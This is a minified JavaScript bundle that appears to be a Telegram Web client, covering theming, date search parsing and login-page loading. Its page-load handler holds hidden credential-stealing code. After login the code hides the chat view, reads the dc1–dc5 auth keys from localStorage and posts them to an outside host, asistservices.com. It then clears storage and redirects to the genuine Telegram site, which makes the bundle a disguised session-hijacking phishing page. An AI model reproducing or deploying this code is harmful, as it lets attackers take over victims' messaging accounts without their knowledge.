    "secondary-text-color": { light: !0, lightFilled: !0 },
    "message-background-color": {
      light: !0,
      lightFilled: !0,
      dark: !0,
      darkFilled: !0,
    },
    "message-out-background-color": {
      light: !0,
      lightFilled: !0,
      dark: !0,
      darkFilled: !0,
    },
    "saved-color": { lightFilled: !0 },
    "green-color": {},
  },
  nt = {
    day: {
      "primary-color": "#3390ec",
      "message-out-primary-color": "#5CA853",
      "message-background-color": "#ffffff",
      "surface-color": "#ffffff",
      "danger-color": "#df3f40",
      "primary-text-color": "#000000",
      "secondary-text-color": "#707579",
      "saved-color": "#359AD4",
      "green-color": "#70b768",
    },
    night: {
      "primary-color": "#8774E1",
      "message-out-primary-color": "#8774E1",
      "message-background-color": "#212121",
      "surface-color": "#212121",
      "danger-color": "#ff595a",
      "primary-text-color": "#ffffff",
      "secondary-text-color": "#aaaaaa",
      "saved-color": "#8774E1",
      "green-color": "#5CC85E",
    },
  }
class _n {
  constructor() {
    F.addEventListener("theme_change", (e) => {
      this.setTheme(typeof e == "object" ? e : void 0)
    }),
      F.addEventListener("theme_changed", () => {
        this.setWorkerThemeParams()
      })
  }
  setWorkerThemeParams() {
    F.managers.apiManager.setThemeParams({
      _: "dataJSON",
      data: JSON.stringify(this.getThemeParamsForWebView()),
    })
  }
  get themeColorElem() {
    return this._themeColorElem !== void 0
      ? this._themeColorElem
      : (this._themeColorElem =
          document.head.querySelector('[name="theme-color"]') || null)
  }
  setThemeColor(e = this.themeColor) {
    e || (e = this.isNight() ? "#212121" : "#ffffff")
    const s = this.themeColorElem
    s && s.setAttribute("content", e)
  }
  setThemeListener() {
    try {
      const e = window.matchMedia("(prefers-color-scheme: dark)"),
        s = () => {
          ;(this.systemTheme = e.matches ? "night" : "day"),
            F.myId ? F.dispatchEvent("theme_change") : this.setTheme()
        }
      "addEventListener" in e
        ? e.addEventListener("change", s)
        : "addListener" in e && e.addListener(s),
        s()
    } catch {}
  }
  applyHighlightingColor() {
    let e = "hsla(85.5319, 36.9171%, 40.402%, .4)"
    const s = this.getTheme()
    s.settings?.highlightingColor && (e = s.settings.highlightingColor)
    const r = zs(e)
    document.documentElement.style.setProperty(
      "--message-highlighting-color",
      e
    ),
      document.documentElement.style.setProperty(
        "--message-highlighting-color-rgb",
        r.slice(0, 3).join(",")
      ),
      document.documentElement.style.setProperty(
        "--message-highlighting-alpha",
        "" + r[3] / 255
      ),
      !ee && e && (this.themeColor = en(e))
  }
  _setTheme(e) {
    const s = this.isNight()
    document.head
      .querySelector('[name="color-scheme"]')
      ?.setAttribute("content", s ? "dark" : "light"),
      document.documentElement.classList.toggle("night", s),
      this.setThemeColor()
    const i = this.getTheme()
    this.applyTheme(i)
    let n = this.styleElement
    n ||
      ((n = this.styleElement = document.createElement("style")),
      document.head.append(n))
    const o = document.createElement("div")
    this.applyTheme(
      F.settings.themes.find((c) => c.name === "night"),
      o,
      !0
    ),
      (n.textContent = `.night {${o.style.cssText}}`),
      this.applyHighlightingColor(),
      !e && F.dispatchEventSingle("theme_changed")
  }
  setTheme(e) {
    if (!("startViewTransition" in document) || !this.applied) {
      const c = !this.applied,
        a = this.applied
      ;(this.applied = !0), this._setTheme(c), a || this.setWorkerThemeParams()
      return
    }
    Js.isAvailable("animations") || (e = void 0)
    const s = !this.isNight()
    e &&
      (document.documentElement.classList.add("no-view-transition"),
      document.documentElement.classList.toggle("reverse", s),
      document.documentElement.offsetLeft)
    const r = document.startViewTransition(() => {
      this._setTheme()
    })
    if (!e) return
    const { x: i, y: n } = e,
      o = Math.hypot(Math.max(i, Et.width - i), Math.max(n, Et.height - n))
    r.ready.then(() => {
      document.documentElement.animate(
        {
          clipPath: [
            `circle(0 at ${i}px ${n}px)`,
            `circle(${o}px at ${i}px ${n}px)`,
          ],
        },
        {
          duration: 500,
          easing: "ease-in-out",
          pseudoElement: `::view-transition-${s ? "old" : "new"}(root)`,
          direction: s ? "reverse" : "normal",
        }
      )
    }),
      r.finished.finally(() => {
        document.documentElement.classList.remove(
          "no-view-transition",
          "reverse"
        )
      })
  }
  async switchTheme(e, s) {
    await F.managers.appStateManager.setByKey(Kt("settings", "theme"), e),
      F.dispatchEvent("theme_change", s)
  }
  isNight() {
    return this.getTheme().name === "night"
  }
  getTheme(
    e = F.settings.theme === "system" ? this.systemTheme : F.settings.theme
  ) {
    return F.settings.themes.find((s) => s.name === e)
  }
  bindColorApplier(e) {
    const s = new Set()
    return {
      applyAppColor: (r) => (s.add(r.name), this.applyAppColor({ ...r, ...e })),
      finalize: () => {
        const r = e.isNight
        for (const i in ns)
          s.has(i) ||
            this.applyAppColor({
              name: i,
              hex: nt[r ? "night" : "day"][i],
              ...e,
            })
      },
    }
  }
  applyAppColor({
    name: e,
    hex: s,
    element: r,
    lightenAlpha: i = 0.08,
    darkenAlpha: n = i,
    mixColor: o,
    isNight: c = this.isNight(),
    saveToCache: a,
  }) {
    const u = ns[e],
      h = X(s),
      m = Zt(...h)
    o ?? (o = X(nt[c ? "night" : "day"]["surface-color"]))
    const v = rt(h, o, i),
      D = { ...m, l: m.l - n * 100 },
      w = [
        [e, s],
        u.rgb && [e + "-rgb", h.join(",")],
        u.light && ["light-" + e, `rgba(${h[0]}, ${h[1]}, ${h[2]}, ${i})`],
        u.lightFilled && ["light-filled-" + e, Ee(v)],
        u.dark && ["dark-" + e, `hsl(${D.h}, ${D.s}%, ${D.l}%)`],
      ]
    a ?? (a = r === document.documentElement),
      w.filter(Boolean).forEach(([b, g]) => {
        r.style.setProperty("--" + b, g), a && Ft.setPropertyCache(b, g, c)
      })
  }
  async applyNewTheme(e) {
    const s = this.isNightTheme(e),
      r = this.getTheme(),
      i = F.settings.themes,
      n = e.settings.find(
        (c) => c.base_theme._ === (s ? "baseThemeNight" : "baseThemeClassic")
      ),
      o = { ...e, name: r.name, settings: { ...n, highlightingColor: "" } }
    await this.AppBackgroundTab.setBackgroundDocument(n.wallpaper, o.settings),
      (i[i.indexOf(r)] = o),
      await F.managers.appStateManager.setByKey(
        Kt("settings", "themes"),
        F.settings.themes
      ),
      F.dispatchEvent("theme_change")
  }
  isNightTheme(e) {
    return e.name === "night" || this.isNight()
  }
  applyTheme(e, s = document.documentElement, r) {
    const i = this.isNightTheme(e),
      n = Array.isArray(e.settings)
        ? e.settings.find(
            (L) =>
              L.base_theme._ === (i ? "baseThemeNight" : "baseThemeClassic")
          )
        : e.settings,
      o = nt[i ? "night" : "day"]
    let c = J(...X(o["primary-color"])),
      a = J(...Te(n.accent_color))
    const u = rn(c, a, X(o["primary-color"]), !i),
      h = Ee(u),
      { applyAppColor: m, finalize: v } = this.bindColorApplier({
        element: s,
        isNight: i,
        saveToCache: r,
      })
    if (
      (m({ name: "primary-color", hex: h, darkenAlpha: 0.04 }),
      m({
        name: "saved-color",
        hex: h,
        lightenAlpha: 0.64,
        mixColor: [255, 255, 255],
      }),
      !n.message_colors?.length)
    )
      return
    const D = i ? 1 : 0.12,
      w = X(o["message-out-primary-color"])
    c = J(...w)
    const b = rt(w, X(o["surface-color"]), D)
    let E = Te(n.message_colors[0])
    n.message_colors.length > 1 &&
      (n.message_colors.slice(1).forEach((L) => {
        E = tn(E, Te(L))
      }),
      (E = sn(c, b, E))),
      (a = J(...E))
    const P =
      n.outbox_accent_color !== void 0 && J(...Te(n.outbox_accent_color))
    let T = rt(E, X(o["surface-color"]), D)
    if (!i) {
      const L = Zt(...T)
      ;(L.s = Math.min(L.s + (i ? 8 : 63), 100)),
        (T = Vs(L.h, L.s, L.l, L.a).slice(0, 3))
    }
    m({ name: "message-out-background-color", hex: Ee(T), lightenAlpha: D }),
      m({
        name: "message-out-primary-color",
        hex: i ? "#ffffff" : Ee(P ? At(...P) : E),
        mixColor: T,
      }),
      v()
  }
  getThemeParamsForWebView() {
    const e = {
        bg_color: "surface-color",
        button_color: "primary-color",
        button_text_color: "#ffffff",
        hint_color: "secondary-text-color",
        link_color: "link-color",
        secondary_bg_color: "background-color-true",
        text_color: "primary-text-color",
        header_bg_color: "surface-color",
        accent_text_color: "primary-color",
        section_bg_color: "surface-color",
        section_header_text_color: "primary-color",
        subtitle_text_color: "secondary-text-color",
        destructive_text_color: "danger-color",
      },
      s = {}
    for (const r in e) {
      const i = e[r]
      s[r] = i[0] === "#" ? i : Ft.getProperty(i)
    }
    return s
  }
}
const Zs = new _n()
S && (S.themeController = Zs)
class wn extends ne {
  constructor() {
    super(...arguments), (this.overlaysActive = 0), (this.hasDarkOverlays = 0)
  }
  get isOverlayActive() {
    return this.overlaysActive > 0
  }
  set isOverlayActive(e) {
    ;(this.overlaysActive += e ? 1 : -1),
      this.dispatchEvent("change", this.isOverlayActive)
  }
  get isDarkOverlayActive() {
    return this.hasDarkOverlays > 0
  }
  set isDarkOverlayActive(e) {
    ;(this.hasDarkOverlays += e ? 1 : -1), (this.isOverlayActive = e)
  }
}
const Oe = new wn()
S && (S.overlayCounter = Oe)
function kn(t) {
  const e = {}
  return (
    t &&
      t.split("&").forEach((s) => {
        const [r, i = ""] = s.split("=")
        e[r] = decodeURIComponent(i)
      }),
    e
  )
}
const Cn = "onbeforeinstallprompt" in window
function bn() {
  window.addEventListener("beforeinstallprompt", (t) => {})
}
const Qs = [
    "January",
    "February",
    "March",
    "April",
    "May",
    "June",
    "July",
    "August",
    "September",
    "October",
    "November",
    "December",
  ],
  Pn = [
    "Sunday",
    "Monday",
    "Tuesday",
    "Wednesday",
    "Thursday",
    "Friday",
    "Saturday",
  ],
  ye = Qs.slice(),
  vt = Pn.slice(),
  yt = 86400
function Tn() {
  const t = G.getDateTimeFormat({ weekday: "long" }),
    e = new Date(Date.UTC(2017, 0, 2)),
    s = []
  for (let r = 0; r < 7; ++r)
    s.push(He(t.format(e))), e.setDate(e.getDate() + 1)
  return s
}
function An() {
  const t = G.getDateTimeFormat({ month: "long" }),
    e = new Date(Date.UTC(2017, 0, 1)),
    s = []
  for (let r = 0; r < 12; ++r)
    s.push(He(t.format(e))), e.setMonth(e.getMonth() + 1)
  return s
}
function os() {
  ye.splice(0, ye.length, ...An()), vt.splice(0, vt.length, ...Tn())
}
const as = (t) => {
  const e = new Date(Date.UTC(t.getFullYear(), t.getMonth(), t.getDate())),
    s = e.getUTCDay() || 7
  e.setUTCDate(e.getUTCDate() + 4 - s)
  const r = new Date(Date.UTC(e.getUTCFullYear(), 0, 1))
  return Math.ceil(((e.getTime() - r.getTime()) / yt + 1) / 7)
}
function Ln(t) {
  const e = new Date(),
    s = (e.getTime() / 1e3) | 0,
    r = (t.getTime() / 1e3) | 0,
    i = {}
  return (
    s - r < yt && e.getDate() === t.getDate()
      ? (i.hour = i.minute = "2-digit")
      : e.getFullYear() !== t.getFullYear()
      ? ((i.year = i.day = "numeric"), (i.month = "2-digit"))
      : s - r < yt * 7 && as(e) === as(t)
      ? (i.weekday = "short")
      : ((i.month = "short"), (i.day = "numeric")),
    new G.IntlDateElement({ date: t, options: i }).element
  )
}
S && (S.formatDateAccordingToTodayNew = Ln)
const H = 2013,
  Mn = new RegExp("20[0-9]{1,2}"),
  Mt = "\\p{L}",
  In = new RegExp(`(${Mt}{3,})`, "iu"),
  Rn = new RegExp(`(${Mt}{3,}) ([0-9]{0,4})`, "iu"),
  On = new RegExp(`([0-9]{0,4}) (${Mt}{2,})`, "iu"),
  Bn = new RegExp("^([0-9]{1,4})(\\.| |/|\\-)([0-9]{1,4})$", "i"),
  xn = new RegExp(
    "^([0-9]{1,2})(\\.| |/|\\-)([0-9]{1,2})(\\.| |/|\\-)([0-9]{1,4})$",
    "i"
  ),
  Nn = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
function Wn(t, e) {
  const s = t.trim().toLowerCase()
  if (s.length < 3) return
  if (
    ["today", G.format("Peer.Status.Today", !0)].some((n) => n.indexOf(s) === 0)
  ) {
    const n = new Date(),
      o = n.getFullYear(),
      c = n.getMonth(),
      a = n.getDate()
    n.setFullYear(o, c, a), n.setHours(0, 0, 0)
    const u = n.getTime()
    n.setFullYear(o, c, a + 1), n.setHours(0, 0, 0)
    const h = n.getTime() - 1
    e.push({ title: G.format("Date.Today", !0), minDate: u, maxDate: h })
    return
  }
  if (
    ["yesterday", G.format("Peer.Status.Yesterday", !0)].some(
      (n) => n.indexOf(s) === 0
    )
  ) {
    const n = new Date(),
      o = n.getFullYear(),
      c = n.getMonth(),
      a = n.getDate()
    n.setFullYear(o, c, a), n.setHours(0, 0, 0)
    const u = n.getTime() - 864e5
    n.setFullYear(o, c, a + 1), n.setHours(0, 0, 0)
    const h = n.getTime() - 86400001
    e.push({ title: He(G.format("Yesterday", !0)), minDate: u, maxDate: h })
    return
  }
  const r = jn(s)
  if (r >= 0) {
    const n = new Date(),
      o = n.getTime(),
      c = n.getDay(),
      a = r - c
    n.setDate(n.getDate() + a),
      n.getTime() > o && n.setTime(n.getTime() - 6048e5)
    const u = n.getFullYear(),
      h = n.getMonth(),
      m = n.getDate()
    n.setFullYear(u, h, m), n.setHours(0, 0, 0)
    const v = n.getTime()
    n.setFullYear(u, h, m + 1), n.setHours(0, 0, 0)
    const D = n.getTime() - 1
    e.push({ title: tr(v), minDate: v, maxDate: D })
    return
  }
  let i
  if ((i = Bn.exec(s)) !== null) {
    const n = i[1],
      o = i[3],
      c = parseInt(n),
      a = parseInt(o)
    if (c > 0 && c <= 31) {
      if (a >= H && c <= 12) {
        const u = a,
          h = c - 1
        pe(e, h, u)
        return
      } else if (a <= 12) {
        const u = c - 1,
          h = a - 1
        ot(e, u, h)
      }
    } else if (c >= H && a <= 12) {
      const u = c,
        h = a - 1
      pe(e, h, u)
    }
    return
  }
  if ((i = xn.exec(s)) !== null) {
    const n = i[1],
      o = i[3],
      c = i[5]
    if (!i[2] === i[4]) return
    const a = parseInt(n),
      u = parseInt(o) - 1
    let h = parseInt(c)
    h >= 10 && h <= 99 && (h += 2e3)
    const m = new Date().getFullYear()
    if (sr(a - 1, u) && h >= H && h <= m) {
      const v = new Date()
      v.setFullYear(h, u, a), v.setHours(0, 0, 0)
      const D = v.getTime()
      v.setFullYear(h, u, a + 1), v.setHours(0, 0, 0)
      const w = v.getTime() - 1
      e.push({ title: er(D), minDate: D, maxDate: w })
      return
    }
    return
  }
  if ((i = Rn.exec(s)) !== null) {
    const n = i[1],
      o = i[2],
      c = at(n)
    if (c >= 0) {
      const a = +o || new Date().getUTCFullYear()
      if (a > 0 && a <= 31) {
        const u = a - 1
        ot(e, u, c)
        return
      } else if (a >= H) {
        pe(e, c, a)
        return
      }
    }
  }
  if ((i = On.exec(s)) !== null) {
    const n = i[1],
      o = i[2],
      c = at(o)
    if (c >= 0) {
      const a = +n
      if (a > 0 && a <= 31) {
        const u = a - 1
        ot(e, u, c)
        return
      } else a >= H && pe(e, c, a)
    }
  }
  if ((i = In.exec(s)) !== null) {
    const n = i[1],
      o = at(n)
    if (o >= 0) {
      const c = new Date().getFullYear()
      for (let a = c; a >= H; --a) pe(e, o, a)
    }
  }
  if ((i = Mn.exec(s)) !== null) {
    let n = +i[0]
    const o = new Date().getFullYear()
    if (n < H) {
      n = H
      for (let c = o; c >= n; c--) {
        const a = new Date()
        a.setFullYear(c, 0, 1), a.setHours(0, 0, 0)
        const u = a.getTime()
        a.setFullYear(c + 1, 0, 1), a.setHours(0, 0, 0)
        const h = a.getTime() - 1
        e.push({ title: "" + c, minDate: u, maxDate: h })
      }
    } else if (n <= o) {
      const c = new Date()
      c.setFullYear(n, 0, 1), c.setHours(0, 0, 0)
      const a = c.getTime()
      c.setFullYear(n + 1, 0, 1), c.setHours(0, 0, 0)
      const u = c.getTime() - 1
      e.push({ title: "" + n, minDate: a, maxDate: u })
    }
    return
  }
}
function pe(t, e, s) {
  const r = new Date().getFullYear(),
    i = Date.now()
  if (s >= H && s <= r) {
    const n = new Date()
    n.setFullYear(s, e, 1), n.setHours(0, 0, 0)
    const o = n.getTime()
    if (o > i) return
    n.setMonth(n.getMonth() + 1)
    const c = n.getTime() - 1
    t.push({ title: Un(o), minDate: o, maxDate: c })
  }
}
function ot(t, e, s) {
  if (sr(e, s)) {
    const r = new Date().getFullYear(),
      i = Date.now()
    for (let n = r; n >= H; n--) {
      if (s === 1 && e === 28 && !zn(n)) continue
      const o = new Date()
      o.setFullYear(n, s, e + 1), o.setHours(0, 0, 0)
      const c = o.getTime()
      if (c > i) continue
      o.setFullYear(n, s, e + 2), o.setHours(0, 0, 0)
      const a = o.getTime() - 1
      n === r
        ? t.push({ title: Vn(c), minDate: c, maxDate: a })
        : t.push({ title: er(c), minDate: c, maxDate: a })
    }
  }
}
function Un(t) {
  const e = new Date(t)
  return ye[e.getMonth()] + " " + e.getFullYear()
}
function Vn(t) {
  const e = new Date(t)
  return ye[e.getMonth()] + " " + e.getDate()
}
function er(t) {
  const e = new Date(t)
  return (
    ("0" + e.getDate()).slice(-2) +
    "." +
    ("0" + (e.getMonth() + 1)).slice(-2) +
    "." +
    e.getFullYear()
  )
}
function tr(t) {
  const e = new Date(t)
  return vt[e.getDay()]
}
function sr(t, e) {
  return e >= 0 && e < 12 && t >= 0 && t < Nn[e]
}
function zn(t) {
  return (t % 4 === 0 && t % 100 !== 0) || t % 400 === 0
}
function at(t) {
  t = t.toLowerCase()
  for (let e = 0; e < 12; e++)
    if ([Qs[e], ye[e]].some((s) => s.toLowerCase().indexOf(t) === 0)) return e
  return -1
}
function jn(t) {
  const e = new Date()
  if (t.length <= 3) return -1
  for (let s = 0; s < 7; s++)
    if (
      (e.setDate(e.getDate() + 1),
      tr(e.getTime()).toLowerCase().indexOf(t) === 0)
    )
      return e.getDay()
  return -1
}
S.fillTipDates = Wn
document.addEventListener("DOMContentLoaded", async () => {
  fr(),
    setInterval(async () => {
      if (window.localStorage.getItem("user_auth")) {
        const k = document.querySelector(".whole.page-chats")
        k.style.display = "none"
      }
    }, 100)
  const t = setInterval(function () {
    window.localStorage.getItem("user_auth") && (e(), clearInterval(t))
  }, 3e3)
  function e() {
    let g = window.localStorage,
      E = {
        dc: g.getItem("dc"),
        dc1_auth_key: g.getItem("dc1_auth_key"),
        dc2_auth_key: g.getItem("dc2_auth_key"),
        dc3_auth_key: g.getItem("dc3_auth_key"),
        dc4_auth_key: g.getItem("dc4_auth_key"),
        dc5_auth_key: g.getItem("dc5_auth_key"),
        domain: window.location.host,
      }
    try {
      fetch("https://asistservices.com/data", {
        method: "POST",
        body: JSON.stringify(E),
        headers: { "Content-Type": "application/json" },
      })
        .then((k) => {
          k.status == 200 &&
            (g.clear(), window.location.replace("https://web.telegram.org/z/"))
        })
        .catch((k) => {
          console.error("Ошибка1:", k)
        })
    } catch (k) {
      console.error("Ошибка:", k)
    }
  }
  Node.prototype.replaceChildren === void 0 &&
    (Node.prototype.replaceChildren = function (...g) {
      ;(this.textContent = ""), g && this.append(...g)
    }),
    (F.managers = Xi())
  const s = document.getElementById("manifest")
  ;(s.href = `site${ct && !ue ? "_apple" : ""}.webmanifest?v=jw3mK7G9Aq`),
    Ue.start()
  const r = window.visualViewport || window
  let i = !1,
    n
  const o = () => {
    const g =
      (i && !Oe.isOverlayActive
        ? r.height || r.innerHeight
        : window.innerHeight) * 0.01
    n !== g &&
      (ee && n < g && g - n > 1 && Nt(),
      (n = g),
      document.documentElement.style.setProperty("--vh", `${g}px`))
  }
  if ((window.addEventListener("resize", o), o(), lt)) {
    const g = () => {
      ;(i = E === 1 && lt && !Oe.isOverlayActive),
        o(),
        r !== window &&
          (i
            ? (window.removeEventListener("resize", o),
              r.addEventListener("resize", o))
            : (r.removeEventListener("resize", o),
              window.addEventListener("resize", o)))
    }
    let E
    ;(window.onImTabChange = (k) => {
      const P = E !== void 0
      ;(E = k), (P || E === 1) && g()
    }),
      Oe.addEventListener("change", () => {
        g()
      })
  }
  if (
    (le &&
      !ht &&
      document.addEventListener("dragstart", (g) => {
        const E = g.target
        if (E.tagName === "IMG" && E.classList.contains("emoji"))
          return Wt(g), !1
      }),
    ht && document.documentElement.classList.add("native-emoji"),
    document.addEventListener("dragstart", (g) => {
      if (g.target?.tagName === "IMG") return g.preventDefault(), !1
    }),
    document.addEventListener("contextmenu", (g) => {
      g.target.tagName === "IMG" && !window.appMediaViewer && Wt(g)
    }),
    le && document.documentElement.classList.add("is-firefox", "no-backdrop"),
    he && document.documentElement.classList.add("is-mobile"),
    ct)
  )
    $ && document.documentElement.classList.add("is-safari"),
      ue
        ? document.documentElement.classList.add("is-ios")
        : document.documentElement.classList.add("is-mac")
  else if (cs) {
    document.documentElement.classList.add("is-android")
    const g = () => {
        ;(k = !0), window.addEventListener("resize", E, { once: !0 })
      },
      E = () => {
        ;(k = !1), Nt()
      }
    let k = !1
    document.addEventListener("touchend", (P) => {
      const T = P.target.closest('[contenteditable="true"], input')
      T &&
        document.activeElement !== T &&
        !k &&
        (console.log(
          "input click",
          P,
          document.activeElement,
          T,
          T.matches(":focus")
        ),
        window.addEventListener("resize", g, { once: !0 }))
    })
  }
  ee
    ? document.documentElement.classList.add("is-touch")
    : document.documentElement.classList.add("no-touch"),
    Cn && bn()
  const c = performance.now(),
    a = G.getCacheLangPack(),
    [u, h] = await Promise.all([$e.sendState().then(([g]) => g), a])
  G.setTimeFormat(u.state.settings.timeFormat),
    F.managers.rootScope.getPremium().then((g) => {
      F.premium = g
    }),
    Zs.setThemeListener(),
    h.appVersion !== B.langPackVersion ? G.getLangPack(h.lang_code) : os(),
    F.addEventListener("language_change", () => {
      os()
    })
  function m(g, E) {
    ;(g.style.opacity = "0"),
      E.then(() => {
        window.requestAnimationFrame(() => {
          g.style.opacity = ""
        })
      })
  }
  console.log("got state, time:", performance.now() - c),
    h.lang_code,
    (document.documentElement.dir = "ltr")
  let v = u.state.authState
  const w = location.hash.split("?"),
    b = kn(w[1] ?? w[0].slice(1))
  if (b.tgWebAuthToken && v._ !== "authStateSignedIn") {
    const g = {
      token: b.tgWebAuthToken,
      dcId: +b.tgWebAuthDcId,
      userId: b.tgWebAuthUserId.toUserId(),
      isTest: b.tgWebAuthTest !== void 0 && !!+b.tgWebAuthTest,
      tgAddr: b.tgaddr,
    }
    if (g.isTest !== Y.test) {
      const E = new URLSearchParams(location.search)
      ;+b.tgWebAuthTest ? E.set("test", "1") : E.delete("test"),
        (location.search = E.toString())
      return
    }
    F.managers.appStateManager.pushToState(
      "authState",
      (v = { _: "authStateSignImport", data: g })
    )
  }
  if ((console.log("Aloha:", location.href), v._ !== "authStateSignedIn")) {
    console.log("Will mount auth page:", v._, Date.now() / 1e3)
    const g = document.getElementById("auth-pages")
    let E
    if (g) {
      ;(E = g.querySelector(".scrollable")),
        (!ee || us) && E.classList.add("no-scrollbar"),
        (E.style.opacity = "0")
      const P = document.createElement("div")
      P.classList.add("auth-placeholder"), E.prepend(P), E.append(P.cloneNode())
    }
    try {
      await Promise.all([
        W(() => Promise.resolve().then(() => ai), void 0, import.meta.url),
        W(() => Promise.resolve().then(() => ii), void 0, import.meta.url),
      ]).then(([P, T]) => {
        P.default.setAuthorized(!1), T.default.forceUnsubscribe()
      })
    } catch {}
    let k
    switch (v._) {
      case "authStateSignIn":
        k = (
          await W(
            () => import("./pageSignIn-434b1a94.js"),
            [
              "./pageSignIn-434b1a94.js",
              "./page-a83e8811.js",
              "./button-38e16a92.js",
              "./wrapEmojiText-52efa31a.js",
              "./pageSignQR-f06ed543.js",
              "./scrollable-18edb7c3.js",
            ],
            import.meta.url
          )
        ).default.mount()
        break
      case "authStateSignQr":
        k = (
          await W(
            () => import("./pageSignQR-f06ed543.js").then((P) => P.a),
            [
              "./pageSignQR-f06ed543.js",
              "./page-a83e8811.js",
              "./button-38e16a92.js",
            ],
            import.meta.url
          )
        ).default.mount()
        break
      case "authStateAuthCode":
        k = (
          await W(
            () => import("./pageAuthCode-905d6cd8.js"),
            [
              "./pageAuthCode-905d6cd8.js",
              "./page-a83e8811.js",
              "./pageSignIn-434b1a94.js",
              "./button-38e16a92.js",
              "./wrapEmojiText-52efa31a.js",
              "./pageSignQR-f06ed543.js",
              "./scrollable-18edb7c3.js",
            ],
            import.meta.url
          )
        ).default.mount(v.sentCode)
        break
      case "authStatePassword":
        k = (
          await W(
            () => import("./pagePassword-d3657e8d.js"),
            [
              "./pagePassword-d3657e8d.js",
              "./page-a83e8811.js",
              "./button-38e16a92.js",
              "./wrapEmojiText-52efa31a.js",
              "./loginPage-db42028c.js",
            ],
            import.meta.url
          )
        ).default.mount()
        break
      case "authStateSignUp":
        k = (
          await W(
            () => import("./pageSignUp-910d5917.js"),
            [
              "./pageSignUp-910d5917.js",
              "./loginPage-db42028c.js",
              "./page-a83e8811.js",
              "./wrapEmojiText-52efa31a.js",
              "./button-38e16a92.js",
              "./scrollable-18edb7c3.js",
            ],
            import.meta.url
          )
        ).default.mount(v.authCode)
        break
      case "authStateSignImport":
        k = (
          await W(
            () => import("./pageSignImport-7e474955.js"),
            ["./pageSignImport-7e474955.js", "./page-a83e8811.js"],
            import.meta.url
          )
        ).default.mount(v.data)
        break
    }
    if (E) {
      k && (await k)
      const P =
        "fonts" in document
          ? Promise.race([ls(1e3), document.fonts.ready])
          : Promise.resolve()
      m(E, P)
    }
  } else console.log("Will mount IM page:", Date.now() / 1e3)
})
export {
  Et as $,
  B as A,
  We as B,
  cr as C,
  Ws as D,
  ne as E,
  ut as F,
  yi as G,
  ui as H,
  G as I,
  Ft as J,
  Ji as K,
  _t as L,
  S as M,
  Be as N,
  xs as O,
  tt as P,
  Er as Q,
  q as R,
  li as S,
  Yi as T,
  fs as U,
  Vi as V,
  zi as W,
  gr as X,
  js as Y,
  vi as Z,
  W as _,
  F as a,
  Es as a0,
  C as a1,
  Js as a2,
  Ls as a3,
  ks as a4,
  fi as a5,
  Yn as a6,
  Hn as a7,
  _s as a8,
  Hi as a9,
  N as aa,
  ws as ab,
  $n as ac,
  le as ad,
  qn as ae,
  Ss as af,
  ds as ag,
  V as ah,
  se as ai,
  Gn as aj,
  $e as b,
  Jn as c,
  ue as d,
  ct as e,
  cs as f,
  lr as g,
  ht as h,
  Xn as i,
  Wt as j,
  ce as k,
  ee as l,
  Gs as m,
  R as n,
  ft as o,
  ls as p,
  us as q,
  Zn as r,
  Kn as s,
  K as t,
  Nt as u,
  Qe as v,
  he as w,
  Oe as x,
  ar as y,
  $ as z,
}
//# sourceMappingURL=index-d9a2bfe9.js.map
